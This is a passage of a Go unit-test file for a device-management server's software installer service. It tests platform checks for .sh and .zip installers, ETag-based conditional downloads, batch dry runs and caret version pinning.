	// Mock darwin host
	ds.HostFunc = func(ctx context.Context, id uint) (*fleet.Host, error) {
		return &fleet.Host{
			ID:           1,
			OrbitNodeKey: ptr.String("orbit_key"),
			Platform:     "darwin",
			TeamID:       ptr.Uint(1),
		}, nil
	}

	// Not an in-house app
	ds.GetInHouseAppMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint) (*fleet.SoftwareInstaller, error) {
		return nil, nil
	}

	// Mock .sh installer metadata (platform='linux' as .sh files are stored)
	ds.GetSoftwareInstallerMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint, withScriptContents bool) (*fleet.SoftwareInstaller, error) {
		return &fleet.SoftwareInstaller{
			InstallerID: 10,
			Name:        "script.sh",
			Extension:   "sh",
			Platform:    "linux", // .sh stored as linux
			TeamID:      ptr.Uint(1),
			TitleID:     ptr.Uint(100),
			SelfService: false,
		}, nil
	}

	// Label scoping check passes
	ds.IsSoftwareInstallerLabelScopedFunc = func(ctx context.Context, installerID, hostID uint) (bool, error) {
		return true, nil
	}

	// No pending install
	ds.GetHostLastInstallDataFunc = func(ctx context.Context, hostID, installerID uint) (*fleet.HostLastInstallData, error) {
		return nil, nil
	}

	// Reset retry attempts (no-op for test)
	ds.ResetNonPolicyInstallAttemptsFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint) error {
		return nil
	}

	// Capture that install request was inserted
	ds.InsertSoftwareInstallRequestFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint, opts fleet.HostSoftwareInstallOptions) (string, error) {
		return "install-uuid", nil
	}

	// Create admin user context
	ctx := viewer.NewContext(context.Background(), viewer.Viewer{
		User: &fleet.User{GlobalRole: ptr.String(fleet.RoleAdmin)},
	})

	// Install .sh on darwin should succeed (not return BadRequestError)
	err := svc.InstallSoftwareTitle(ctx, 1, 100)
	require.NoError(t, err, ".sh install on darwin should succeed")
	require.True(t, ds.InsertSoftwareInstallRequestFuncInvoked, "install request should be created")
}

// TestInstallZipInstallerUsesStoredPlatform tests that .zip installers use the
// stored platform (windows or darwin) rather than inferring darwin from the extension.
func TestInstallZipInstallerUsesStoredPlatform(t *testing.T) {
	t.Parallel()
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	ds.HostFunc = func(ctx context.Context, id uint) (*fleet.Host, error) {
		return &fleet.Host{
			ID:           1,
			OrbitNodeKey: new("orbit_key"),
			Platform:     "windows",
			TeamID:       new(uint(1)),
		}, nil
	}

	ds.GetInHouseAppMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint) (*fleet.SoftwareInstaller, error) {
		return nil, nil
	}

	ds.GetSoftwareInstallerMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint, withScriptContents bool) (*fleet.SoftwareInstaller, error) {
		return &fleet.SoftwareInstaller{
			InstallerID: 10,
			Name:        "codex-x86_64-pc-windows-msvc.exe.zip",
			Extension:   "zip",
			Platform:    "windows",
			TeamID:      new(uint(1)),
			TitleID:     new(uint(100)),
			SelfService: false,
		}, nil
	}

	ds.IsSoftwareInstallerLabelScopedFunc = func(ctx context.Context, installerID, hostID uint) (bool, error) {
		return true, nil
	}

	ds.GetHostLastInstallDataFunc = func(ctx context.Context, hostID, installerID uint) (*fleet.HostLastInstallData, error) {
		return nil, nil
	}

	ds.ResetNonPolicyInstallAttemptsFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint) error {
		return nil
	}

	ds.InsertSoftwareInstallRequestFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint, opts fleet.HostSoftwareInstallOptions) (string, error) {
		return "install-uuid", nil
	}

	ctx := viewer.NewContext(context.Background(), viewer.Viewer{
		User: &fleet.User{GlobalRole: new(fleet.RoleAdmin)},
	})

	err := svc.InstallSoftwareTitle(ctx, 1, 100)
	require.NoError(t, err, ".zip windows installer on windows host should succeed")
	require.True(t, ds.InsertSoftwareInstallRequestFuncInvoked, "install request should be created")
}

// TestUninstallZipInstallerUsesStoredPlatform tests that .zip installers use the
// stored platform during uninstall, so a Windows host can uninstall a Windows
// .zip package without the helper inferring darwin from the extension.
func TestUninstallZipInstallerUsesStoredPlatform(t *testing.T) {
	t.Parallel()
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	ds.HostFunc = func(ctx context.Context, id uint) (*fleet.Host, error) {
		return &fleet.Host{
			ID:           1,
			OrbitNodeKey: new("orbit_key"),
			Platform:     "windows",
			TeamID:       new(uint(1)),
		}, nil
	}

	ds.GetSoftwareInstallerMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint, withScriptContents bool) (*fleet.SoftwareInstaller, error) {
		return &fleet.SoftwareInstaller{
			InstallerID:              10,
			Name:                     "codex-x86_64-pc-windows-msvc.exe.zip",
			Extension:                "zip",
			Platform:                 "windows",
			TeamID:                   new(uint(1)),
			TitleID:                  new(uint(100)),
			UninstallScriptContentID: 20,
		}, nil
	}

	ds.GetHostLastInstallDataFunc = func(ctx context.Context, hostID, installerID uint) (*fleet.HostLastInstallData, error) {
		return nil, nil
	}

	ds.GetAnyScriptContentsFunc = func(ctx context.Context, id uint) ([]byte, error) {
		return []byte("uninstall script"), nil
	}

	ds.InsertSoftwareUninstallRequestFunc = func(ctx context.Context, executionID string, hostID uint, softwareInstallerID uint, selfService bool) error {
		return nil
	}

	ctx := viewer.NewContext(context.Background(), viewer.Viewer{
		User: &fleet.User{GlobalRole: new(fleet.RoleAdmin)},
	})

	err := svc.UninstallSoftwareTitle(ctx, 1, 100)
	require.NoError(t, err, ".zip windows installer on windows host should uninstall")
	require.True(t, ds.InsertSoftwareUninstallRequestFuncInvoked, "uninstall request should be created")
}

// TestSelfServiceInstallZipInstallerUsesStoredPlatform tests that .zip
// installers use the stored platform during self-service install, so a Windows
// host can self-service install a Windows .zip package without the helper
// inferring darwin from the extension.
func TestSelfServiceInstallZipInstallerUsesStoredPlatform(t *testing.T) {
	t.Parallel()
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	ds.GetSoftwareInstallerMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint, withScriptContents bool) (*fleet.SoftwareInstaller, error) {
		return &fleet.SoftwareInstaller{
			InstallerID: 10,
			Name:        "codex-x86_64-pc-windows-msvc.exe.zip",
			Extension:   "zip",
			Platform:    "windows",
			TeamID:      new(uint(1)),
			TitleID:     new(uint(100)),
			SelfService: true,
		}, nil
	}

	ds.IsSoftwareInstallerLabelScopedFunc = func(ctx context.Context, installerID, hostID uint) (bool, error) {
		return true, nil
	}

	ds.ResetNonPolicyInstallAttemptsFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint) error {
		return nil
	}

	ds.InsertSoftwareInstallRequestFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint, opts fleet.HostSoftwareInstallOptions) (string, error) {
		return "install-uuid", nil
	}

	host := &fleet.Host{
		ID:           1,
		OrbitNodeKey: new("orbit_key"),
		Platform:     "windows",
		TeamID:       new(uint(1)),
	}

	err := svc.SelfServiceInstallSoftwareTitle(context.Background(), host, 100)
	require.NoError(t, err, ".zip windows installer on windows host should self-service install")
	require.True(t, ds.InsertSoftwareInstallRequestFuncInvoked, "install request should be created")
}

// TestInstallShScriptOnWindowsFails tests that .sh scripts can't be installed on Windows hosts.
func TestInstallShScriptOnWindowsFails(t *testing.T) {
	t.Parallel()
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	// Mock Windows host
	ds.HostFunc = func(ctx context.Context, id uint) (*fleet.Host, error) {
		return &fleet.Host{
			ID:           1,
			OrbitNodeKey: ptr.String("orbit_key"),
			Platform:     "windows",
			TeamID:       ptr.Uint(1),
		}, nil
	}

	// Not an in-house app
	ds.GetInHouseAppMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint) (*fleet.SoftwareInstaller, error) {
		return nil, nil
	}

	// Mock .sh installer metadata
	ds.GetSoftwareInstallerMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint, withScriptContents bool) (*fleet.SoftwareInstaller, error) {
		return &fleet.SoftwareInstaller{
			InstallerID: 10,
			Name:        "script.sh",
			Extension:   "sh",
			Platform:    "linux",
			TeamID:      ptr.Uint(1),
			TitleID:     ptr.Uint(100),
			SelfService: false,
		}, nil
	}

	// Label scoping check passes
	ds.IsSoftwareInstallerLabelScopedFunc = func(ctx context.Context, installerID, hostID uint) (bool, error) {
		return true, nil
	}

	// No pending install
	ds.GetHostLastInstallDataFunc = func(ctx context.Context, hostID, installerID uint) (*fleet.HostLastInstallData, error) {
		return nil, nil
	}

	// Create admin user context
	ctx := viewer.NewContext(context.Background(), viewer.Viewer{
		User: &fleet.User{GlobalRole: ptr.String(fleet.RoleAdmin)},
	})

	// Install .sh on windows should fail with BadRequestError
	err := svc.InstallSoftwareTitle(ctx, 1, 100)
	require.Error(t, err, ".sh install on windows should fail")

	var bre *fleet.BadRequestError
	require.ErrorAs(t, err, &bre, "error should be BadRequestError")
	require.NotNil(t, bre)
	require.Contains(t, bre.Message, "can be installed only on linux hosts")
}

func TestSelfServiceInstallSoftwareTitleAllowsPersonallyEnrolledDevices(t *testing.T) {
	t.Parallel()
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	// Personally-enrolled iOS/iPadOS hosts must reach the install lookup; the
	// BYOD gate that previously short-circuited them is removed in #44007.
	// Returning NotFound from both software-installer and VPP-app lookups makes
	// the code surface the standard "title not available" error — proving we
	// got past the old gate without entangling this test in the install flow.
	ds.GetSoftwareInstallerMetadataByTeamAndTitleIDFunc = func(_ context.Context, _ *uint, _ uint, _ bool) (*fleet.SoftwareInstaller, error) {
		return nil, &notFoundError{}
	}
	ds.GetVPPAppByTeamAndTitleIDFunc = func(_ context.Context, _ *uint, _ uint) (*fleet.VPPApp, error) {
		return nil, &notFoundError{}
	}
	ds.GetInHouseAppMetadataByTeamAndTitleIDFunc = func(_ context.Context, _ *uint, _ uint) (*fleet.SoftwareInstaller, error) {
		return nil, &notFoundError{}
	}

	for _, platform := range []string{"ios", "ipados"} {
		fakeHost := &fleet.Host{
			Platform: platform,
			MDM: fleet.MDMHostData{
				EnrollmentStatus: ptr.String(string(fleet.MDMEnrollStatusPersonal)),
			},
		}

		err := svc.SelfServiceInstallSoftwareTitle(t.Context(), fakeHost, 1)
		require.Error(t, err, "platform %s", platform)
		require.NotContains(t, err.Error(), fleet.InstallSoftwarePersonalAppleDeviceErrMsg,
			"BYOD gate must no longer block self-service for platform %s", platform)
		require.ErrorContains(t, err, "Software title is not available for install",
			"control flow must reach the standard not-found path for platform %s", platform)
	}
}

func TestConditionalGETBehavior(t *testing.T) {
	t.Parallel()

	content := []byte("#!/bin/bash\necho 'test'\n")
	etag := fmt.Sprintf(`"%x"`, sha256.Sum256(content))

	tests := []struct {
		name          string
		ifNoneMatch   string
		handler       http.HandlerFunc
		expectStatus  int
		expectBodyNil bool
		expectErr     bool
	}{
		{
			name:        "no If-None-Match, normal 200 response",
			ifNoneMatch: "",
			handler: func(w http.ResponseWriter, r *http.Request) {
				assert.Empty(t, r.Header.Get("If-None-Match"))
				w.Header().Set("ETag", etag)
				w.Header().Set("Content-Disposition", `attachment; filename="app.sh"`)
				_, _ = w.Write(content)
			},
			expectStatus:  200,
			expectBodyNil: false,
		},
		{
			name:        "If-None-Match sent, server returns 304",
			ifNoneMatch: etag,
			handler: func(w http.ResponseWriter, r *http.Request) {
				assert.Equal(t, etag, r.Header.Get("If-None-Match"))
				w.WriteHeader(http.StatusNotModified)
			},
			expectStatus:  304,
			expectBodyNil: true,
		},
		{
			name:        "If-None-Match sent, server returns 200 (ETag changed)",
			ifNoneMatch: `"old-etag"`,
			handler: func(w http.ResponseWriter, r *http.Request) {
				assert.Equal(t, `"old-etag"`, r.Header.Get("If-None-Match"))
				w.Header().Set("ETag", etag)
				w.Header().Set("Content-Disposition", `attachment; filename="app.sh"`)
				_, _ = w.Write(content)
			},
			expectStatus:  200,
			expectBodyNil: false,
		},
		{
			name:        "If-None-Match sent, server returns 403",
			ifNoneMatch: etag,
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.WriteHeader(http.StatusForbidden)
			},
			expectStatus: 0,
			expectErr:    true,
		},
		{
			name:        "If-None-Match sent, server returns 500",
			ifNoneMatch: etag,
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.WriteHeader(http.StatusInternalServerError)
			},
			expectStatus: 0,
			expectErr:    true,
		},
		{
			name:        "If-None-Match with S3 multipart ETag",
			ifNoneMatch: `"8fabd6dcf50afffcafbd5c1dbc5f49a4-20"`,
			handler: func(w http.ResponseWriter, r *http.Request) {
				assert.Equal(t, `"8fabd6dcf50afffcafbd5c1dbc5f49a4-20"`, r.Header.Get("If-None-Match"))
				w.WriteHeader(http.StatusNotModified)
			},
			expectStatus:  304,
			expectBodyNil: true,
		},
		{
			name:        "server returns no ETag, normal download",
			ifNoneMatch: "",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.Header().Set("Content-Disposition", `attachment; filename="app.sh"`)
				_, _ = w.Write(content)
			},
			expectStatus:  200,
			expectBodyNil: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			srv := httptest.NewServer(tt.handler)
			t.Cleanup(srv.Close)

			const maxSize = 512 * 1024 * 1024 // 512 MiB, generous for test payloads
			resp, tfr, err := downloadInstallerURL(t.Context(), srv.URL+"/test.sh", tt.ifNoneMatch, maxSize)
			if tt.expectErr {
				require.Error(t, err)
				return
			}
			require.NoError(t, err)

			assert.Equal(t, tt.expectStatus, resp.StatusCode)
			if tt.expectBodyNil {
				assert.Nil(t, tfr)
			} else {
				require.NotNil(t, tfr)
				t.Cleanup(func() { tfr.Close() })
			}
		})
	}
}

func TestValidETag(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name  string
		input string
		valid bool
	}{
		{"strong ETag", `"abc123"`, true},
		{"weak ETag rejected", `W/"abc123"`, false},
		{"empty quotes", `""`, true},
		{"S3 multipart", `"8fabd6dcf50afffcafbd5c1dbc5f49a4-20"`, true},
		{"unquoted", `abc123`, false},
		{"single quote", `"`, false},
		{"empty string", ``, false},
		{"missing closing quote", `"abc`, false},
		{"control char (newline)", "\"abc\n\"", false},
		{"control char (carriage return)", "\"abc\r\"", false},
		{"control char (null)", "\"abc\x00\"", false},
		{"DEL character", "\"abc\x7f\"", false},
		{"tab rejected per RFC 7232", "\"abc\t123\"", false},
		{"inner double-quote rejected", `"abc"def"`, false},
		{"inner space rejected per RFC 7232", `"abc def"`, false},
		{"weak prefix unquoted inner", `W/abc123`, false},
		{"oversized (>512)", `"` + strings.Repeat("a", 512) + `"`, false},
		{"exactly 511 bytes", `"` + strings.Repeat("a", 509) + `"`, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tt.valid, validETag(tt.input))
		})
	}
}

func TestGetInstallScript(t *testing.T) {
	t.Parallel()

	defaultPkgScript := file.GetInstallScript("pkg")
	defaultDebScript := file.GetInstallScript("deb")
	fleetdScript := file.InstallPkgFleetdScript
	customScript := "#!/bin/sh\necho custom"

	tests := []struct {
		name       string
		extension  string
		packageIDs []string
		current    string
		expected   string
	}{
		{
			name:       "fleetd pkg returns fleetd script",
			extension:  "pkg",
			packageIDs: []string{"com.fleetdm.orbit.base.pkg"},
			current:    "",
			expected:   fleetdScript,
		},
		{
			name:       "fleetd pkg overrides default script",
			extension:  "pkg",
			packageIDs: []string{"com.fleetdm.orbit.base.pkg"},
			current:    defaultPkgScript,
			expected:   fleetdScript,
		},
		{
			name:       "fleetd pkg overrides custom script",
			extension:  "pkg",
			packageIDs: []string{"com.fleetdm.orbit.base.pkg"},
			current:    customScript,
			expected:   fleetdScript,
		},
		{
			name:       "non-fleetd pkg returns default script",
			extension:  "pkg",
			packageIDs: []string{"com.example.app"},
			current:    "",
			expected:   defaultPkgScript,
		},
		{
			name:       "non-fleetd pkg preserves custom script",
			extension:  "pkg",
			packageIDs: []string{"com.example.app"},
			current:    customScript,
			expected:   customScript,
		},
		{
			name:       "deb returns default script",
			extension:  "deb",
			packageIDs: []string{"some-package"},
			current:    "",
			expected:   defaultDebScript,
		},
		{
			name:       "deb preserves custom script",
			extension:  "deb",
			packageIDs: []string{"some-package"},
			current:    customScript,
			expected:   customScript,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := getInstallScript(tt.extension, tt.packageIDs, tt.current)
			require.Equal(t, tt.expected, result)
		})
	}
}

func TestBatchSetSoftwareInstallersDryRunEmptyShortCircuit(t *testing.T) {
	t.Parallel()

	// keyValueStore mock that fails the test if any redis call happens
	// The short-circuit must return before touching redis or spawning the goroutine.
	kvs := &redismock.KeyValueStore{
		SetFunc: func(ctx context.Context, key string, value string, expireTime time.Duration) error {
			t.Errorf("unexpected keyValueStore.Set call: key=%s", key)
			return nil
		},
		GetFunc: func(ctx context.Context, key string) (*string, error) {
			t.Errorf("unexpected keyValueStore.Get call: key=%s", key)
			return nil, nil
		},
	}

	ds := new(mock.Store)
	ds.TeamByNameFunc = func(ctx context.Context, name string) (*fleet.Team, error) {
		return &fleet.Team{ID: 1, Name: name}, nil
	}
	// The team has no installers, so the empty-payload dry run has nothing to
	// report as pending deletion and must short-circuit.
	ds.GetSoftwareInstallersPendingDeletionFunc = func(ctx context.Context, tmID *uint, incoming []fleet.SoftwareTitleIdentifier) ([]fleet.DeletedSoftwarePackage, error) {
		return nil, nil
	}

	svc := newTestService(t, ds)
	svc.keyValueStore = kvs
	svc.logger = slog.New(slog.NewTextHandler(io.Discard, nil))

	ctx := viewer.NewContext(context.Background(), viewer.Viewer{
		User: &fleet.User{GlobalRole: ptr.String(fleet.RoleAdmin)},
	})

	// Cover both the team-scoped (tmName != "") and no-team (tmName == "") paths.
	// The customer's reported failure mode in #42607 was on the global / no-team
	// endpoint, which skips the TeamByName lookup entirely and flows straight
	// to the short-circuit.
	cases := []struct {
		name             string
		tmName           string
		payloads         []*fleet.SoftwareInstallerPayload
		expectTeamLookup bool
	}{
		{"team scoped, nil payloads", "TestEmpty", nil, true},
		{"team scoped, empty payloads", "TestEmpty", []*fleet.SoftwareInstallerPayload{}, true},
		{"no team, nil payloads", "", nil, false},
		{"no team, empty payloads", "", []*fleet.SoftwareInstallerPayload{}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			kvs.SetFuncInvoked = false
			kvs.GetFuncInvoked = false
			ds.TeamByNameFuncInvoked = false
			ds.GetSoftwareInstallersPendingDeletionFuncInvoked = false

			requestUUID, err := svc.BatchSetSoftwareInstallers(ctx, c.tmName, c.payloads, true)
			require.NoError(t, err)
			require.Empty(t, requestUUID, "dry-run + empty payload should return empty request_uuid")
			require.False(t, kvs.SetFuncInvoked, "keyValueStore.Set must not be called")
			require.False(t, kvs.GetFuncInvoked, "keyValueStore.Get must not be called")
			require.Equal(t, c.expectTeamLookup, ds.TeamByNameFuncInvoked,
				"TeamByName should only be called when tmName != \"\"")
			require.True(t, ds.GetSoftwareInstallersPendingDeletionFuncInvoked,
				"the short-circuit must check for installers pending deletion")
		})
	}
}

func TestSelfServiceInstallAllSoftwareTitles(t *testing.T) {
	ctx := t.Context()
	host := &fleet.Host{ID: 1, Platform: "darwin"}

	// Each field injects a failure at one point of the flow; a nil field means that
	// step succeeds. The zero value drives two successful package installs.
	type failures struct {
		getTitles    error // GetSoftwareTitlesForInstallAll
		installTitle error // the per-title install (SelfServiceInstallSoftwareTitle)
		newActivity  error // the roll-up activity
	}

	setup := func(fail failures) (*Service, *strings.Builder) {
		ds := new(mock.Store)
		ds.GetSoftwareTitlesForInstallAllFunc = func(ctx context.Context, host *fleet.Host, categoryID *uint) ([]*fleet.HostSoftwareWithInstaller, *string, error) {
			if fail.getTitles != nil {
				return nil, nil, fail.getTitles
			}
			return []*fleet.HostSoftwareWithInstaller{{ID: 10}, {ID: 11}}, nil, nil
		}
		ds.GetSoftwareInstallerMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint, withScriptContents bool) (*fleet.SoftwareInstaller, error) {
			if fail.installTitle != nil {
				return nil, fail.installTitle
			}
			return &fleet.SoftwareInstaller{InstallerID: 1, SelfService: true, Name: "foo.pkg"}, nil
		}
		ds.IsSoftwareInstallerLabelScopedFunc = func(ctx context.Context, installerID uint, hostID uint) (bool, error) {
			return true, nil
		}
		ds.ResetNonPolicyInstallAttemptsFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint) error {
			return nil
		}
		ds.InsertSoftwareInstallRequestFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint, opts fleet.HostSoftwareInstallOptions) (string, error) {
			return "exec-uuid", nil
		}
		svc, baseSvc := newTestServiceWithMock(t, ds)
		baseSvc.NewActivityFunc = func(ctx context.Context, user *fleet.User, activity fleet.ActivityDetails) error {
			return fail.newActivity
		}
		var logs strings.Builder
		svc.logger = slog.New(slog.NewTextHandler(&logs, nil))
		return svc, &logs
	}

	t.Run("returns the error when listing titles fails", func(t *testing.T) {
		svc, _ := setup(failures{getTitles: errors.New("boom")})
		err := svc.SelfServiceInstallAllSoftwareTitles(ctx, host, nil)
		require.ErrorContains(t, err, "get software titles for install all")
	})

	t.Run("logs per-title failures and continues instead of aborting the batch", func(t *testing.T) {
		svc, logs := setup(failures{installTitle: errors.New("lookup failed")})
		err := svc.SelfServiceInstallAllSoftwareTitles(ctx, host, nil)
		require.NoError(t, err) // a per-title failure is logged, not returned
		// both titles were attempted (the loop continued past the first failure) and logged
		require.Contains(t, logs.String(), "title_id=10")
		require.Contains(t, logs.String(), "title_id=11")
	})

	t.Run("returns the error when the roll-up activity fails", func(t *testing.T) {
		svc, _ := setup(failures{newActivity: errors.New("activity failed")})
		err := svc.SelfServiceInstallAllSoftwareTitles(ctx, host, nil)
		require.ErrorContains(t, err, "creating installed all self-service software activity")
	})
}

// inMemoryKeyValueStore is a thread-safe map-backed KeyValueStore mock for
// tests that need to observe what the batch goroutine writes.
func inMemoryKeyValueStore() (*redismock.KeyValueStore, func(key string) *string) {
	var mu sync.Mutex
	values := make(map[string]string)
	kvs := &redismock.KeyValueStore{
		SetFunc: func(ctx context.Context, key string, value string, expireTime time.Duration) error {
			mu.Lock()
			defer mu.Unlock()
			values[key] = value
			return nil
		},
		GetFunc: func(ctx context.Context, key string) (*string, error) {
			mu.Lock()
			defer mu.Unlock()
			if v, ok := values[key]; ok {
				return &v, nil
			}
			return nil, nil
		},
	}
	get := func(key string) *string {
		mu.Lock()
		defer mu.Unlock()
		if v, ok := values[key]; ok {
			return &v
		}
		return nil
	}
	return kvs, get
}

func TestBatchSetSoftwareInstallersDryRunEmptyReportsDeletions(t *testing.T) {
	t.Parallel()

	kvs, getKey := inMemoryKeyValueStore()

	wouldDelete := []fleet.DeletedSoftwarePackage{
		{TeamID: nil, TitleID: 1, DisplayName: "Cool App"},
		{TeamID: nil, TitleID: 2, DisplayName: "Teammate Tool"},
	}

	ds := new(mock.Store)
	ds.GetSoftwareInstallersPendingDeletionFunc = func(ctx context.Context, tmID *uint, incoming []fleet.SoftwareTitleIdentifier) ([]fleet.DeletedSoftwarePackage, error) {
		// assert (not require): this runs on the batch goroutine, where FailNow would misbehave.
		assert.Empty(t, incoming)
		return wouldDelete, nil
	}
	ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
		return &fleet.AppConfig{}, nil
	}

	svc := newTestService(t, ds)
	svc.keyValueStore = kvs
	svc.logger = slog.New(slog.NewTextHandler(io.Discard, nil))

	ctx := viewer.NewContext(t.Context(), viewer.Viewer{
		User: &fleet.User{GlobalRole: new(fleet.RoleAdmin)},
	})

	// Empty payload + dry run, but the (no-)team has installers: must NOT
	// short-circuit, and must report every installer as pending deletion.
	requestUUID, err := svc.BatchSetSoftwareInstallers(ctx, "", nil, true)
	require.NoError(t, err)
	require.NotEmpty(t, requestUUID, "dry run with installers pending deletion must go through the async path")

	// Wait for the background goroutine to complete the batch.
	require.Eventually(t, func() bool {
		status := getKey(batchSoftwarePrefix + requestUUID)
		return status != nil && *status == batchSetCompleted
	}, 10*time.Second, 50*time.Millisecond, "batch never completed")

	deletedJSON := getKey(batchSoftwarePrefix + requestUUID + batchSoftwareDeletedSuffix)
	require.NotNil(t, deletedJSON, "deleted-packages key must be written before completion")
	var gotDeleted []fleet.DeletedSoftwarePackage
	require.NoError(t, json.Unmarshal([]byte(*deletedJSON), &gotDeleted))
	require.Equal(t, wouldDelete, gotDeleted)

	// The result endpoint returns the deleted packages on the dry-run completed branch.
	status, message, packages, deletedPackages, _, err := svc.GetBatchSetSoftwareInstallersResult(ctx, "", requestUUID, true)
	require.NoError(t, err)
	require.Equal(t, fleet.BatchSetSoftwareInstallersStatusCompleted, status)
	require.Empty(t, message)
	require.Empty(t, packages)
	require.Equal(t, wouldDelete, deletedPackages)
}

func TestBatchSetSoftwareInstallersSkipsURLValidationForScriptPackages(t *testing.T) {
	t.Parallel()

	ds := new(mock.Store)
	svc := newTestService(t, ds)
	svc.logger = slog.New(slog.NewTextHandler(io.Discard, nil))

	ctx := viewer.NewContext(t.Context(), viewer.Viewer{
		User: &fleet.User{GlobalRole: new(fleet.RoleAdmin)},
	})

	// Script only packages use a "script://filename" url to pass the filename,
	// so these should skip url validation
	scriptFilenames := []string{
		"install chatgpt.ps1",
		"my script://app v2.ps1",
		"sub dir/install.ps1",
		`C:\Program Files\install.ps1`,
		"install chatgpt.sh",
		"my script://app v2.sh",
		"sub dir/install.sh",
	}

	for _, name := range scriptFilenames {
		// The trailing "not a url" payload is a tripwire: validation only reaches and
		// rejects it if the script:// payload before it was accepted.
		payloads := []*fleet.SoftwareInstallerPayload{
			{URL: "script://" + name, InstallScript: "echo hi"},
			{URL: "not a url"},
		}
		_, err := svc.BatchSetSoftwareInstallers(ctx, "", payloads, true)
		require.ErrorContains(t, err, `URL ("not a url") is invalid`)
		require.NotContains(t, err.Error(), name)
		require.NotContains(t, err.Error(), "script://")
	}
}

func TestGetBatchSetSoftwareInstallersResultMissingDeletedKey(t *testing.T) {
	t.Parallel()

	// Status key exists (completed) but the deleted-packages key is missing or
	// expired: must degrade to an empty list, not an error.
	completed := batchSetCompleted
	kvs := &redismock.KeyValueStore{
		GetFunc: func(ctx context.Context, key string) (*string, error) {
			if key == batchSoftwarePrefix+"test-uuid" {
				return &completed, nil
			}
			return nil, nil
		},
	}

	ds := new(mock.Store)
	svc := newTestService(t, ds)
	svc.keyValueStore = kvs
	svc.logger = slog.New(slog.NewTextHandler(io.Discard, nil))

	ctx := viewer.NewContext(t.Context(), viewer.Viewer{
		User: &fleet.User{GlobalRole: new(fleet.RoleAdmin)},
	})

	status, message, packages, deletedPackages, _, err := svc.GetBatchSetSoftwareInstallersResult(ctx, "", "test-uuid", true)
	require.NoError(t, err)
	require.Equal(t, fleet.BatchSetSoftwareInstallersStatusCompleted, status)
	require.Empty(t, message)
	require.Empty(t, packages)
	require.Empty(t, deletedPackages)
}

func TestVersionMatchesMajor(t *testing.T) {
	// Versions taken from ee/maintained-apps/outputs; most are not valid semver. The leading dot-segment is
	// compared as a string, so a leading-zero or bare major stays distinct from "2"/"10"/"12".
	cases := []struct {
		version      string
		majorVersion string
		want         bool
	}{
		{"149.1.91.172", "149", true},
		{"149.1.91.172", "150", false},
		{"149.1.91.172", "14", false},
		{"6.0.4.11438", "6", true},
		{"25.0.208.0", "25", true},
		{"221.0.0.0.0", "221", true},
		{"0.2026.06.10.09.27.01", "0", true},
		{"8.0.47.CE", "8", true},
		{"2.2.18d", "2", true},
		{"1.2.92.148.g882cc571", "1", true},
		{"114.0.4-release.20250509.32955", "114", true},
		{"2026.05.0+218", "2026", true},
		{"02.07.01.62", "02", true},
		{"02.07.01.62", "2", false},
		{"20250302", "20250302", true},
		{"183", "183", true},
		{"149", "149", true},
		{"1.21b", "1", true},
		{"10.0.1", "1", false},
		{"12.0", "1", false},
	}
	for _, c := range cases {
		assert.Equalf(t, c.want, versionMatchesMajor(c.version, c.majorVersion), "version %q caret ^%s", c.version, c.majorVersion)
	}
}

func TestParsePinnedVersion(t *testing.T) {
	cases := []struct {
		name      string
		version   string
		wantMajor string
		wantCaret bool
		wantErr   string
	}{
		{name: "latest is empty", version: "", wantMajor: "", wantCaret: false},
		{name: "literal 4-component is not a caret", version: "149.0.7827.115", wantMajor: "149.0.7827.115", wantCaret: false},
		{name: "caret major", version: "^149", wantMajor: "149", wantCaret: true},
		{name: "caret leading-zero major", version: "^02", wantMajor: "02", wantCaret: true},
		{name: "empty caret", version: "^", wantErr: errEmptyCaretVersion.Error()},
		{name: "caret with minor", version: "^149.0", wantErr: errNonMajorVersion.Error()},
		{name: "caret 4-component", version: "^149.1.91.172", wantErr: errNonMajorVersion.Error()},
		{name: "caret non-numeric", version: "^abc", wantErr: errNonMajorVersion.Error()},
	}
	for _, c := range cases {
		major, caret, err := parsePinnedVersion(t.Context(), c.version)
		if c.wantErr != "" {
			require.ErrorContainsf(t, err, c.wantErr, "case %s", c.name)
			continue
		}
		require.NoErrorf(t, err, "case %s", c.name)
		assert.Equalf(t, c.wantMajor, major, "case %s", c.name)
		assert.Equalf(t, c.wantCaret, caret, "case %s", c.name)
	}
}
